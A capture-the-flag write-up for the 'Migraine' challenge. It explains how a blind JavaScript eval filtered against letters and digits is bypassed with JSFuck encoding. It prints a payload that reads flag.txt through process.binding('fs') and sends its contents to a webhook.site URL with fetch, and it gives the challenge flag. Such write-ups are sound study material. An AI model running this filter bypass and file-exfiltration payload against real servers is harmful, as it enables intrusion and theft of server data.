# Migraine

Author: `RogueGuardian`

This challenge gave me a migraine to develop, hopefully it doesn't do the same to you.

### Included Note
```
To: Acme Production Team
From: Acme Development Team

Yeah we're 3 weeks behind schedule and we need to push this to production.
As for the issue on section 3, yeah we couldn't figure out how to get output from eval so we will just have to roll with it.
And for the security team, please assure them that we filter out all numbers and letters in the first round so no one can write malicious things.
I think we're good to go!
```

## Solution
After looking at the source code, we see that we have arbitrary code execution in Javascript (as long as the payload doesn't match `A-Za-z0-9`). We also don't get any feedback from the server, so we'll need to exfiltrate the flag to a remote server. To get around the bad characters, we can encode our payload with [JSFuck](http://www.jsfuck.com/). Unfortunately, `require` doesn't work inside JSFuck. Instead, we can use the global `process` object to access system APIs. Here's my (terribly-written) payload that reads the flag, then ships it to a https://webhook.site/ URL via the query string.

```js
var url = "https://webhook.site/9e0f71f1-5174-469d-9148-a09b5257bcef";
var n = 100;
var buffer = Buffer.allocUnsafe(n);
var fs = process.binding('fs');
var path = "flag.txt";
// I don't know what these args actually are, but an exception told me to use this many args
var fd = fs.open(path, 2, 3, 4, 5);
// one of these seeks, so make it zero lmao
fs.read(fd, buffer, 0, n, 0, 0, 0);
var flag = buffer.toString();
console.log(flag)
fetch(url + "?flag=" + flag);
```

The encoded payload is in `payload.js`.

Flag: `gigem{JS_1s_r34lly_we1rd}`
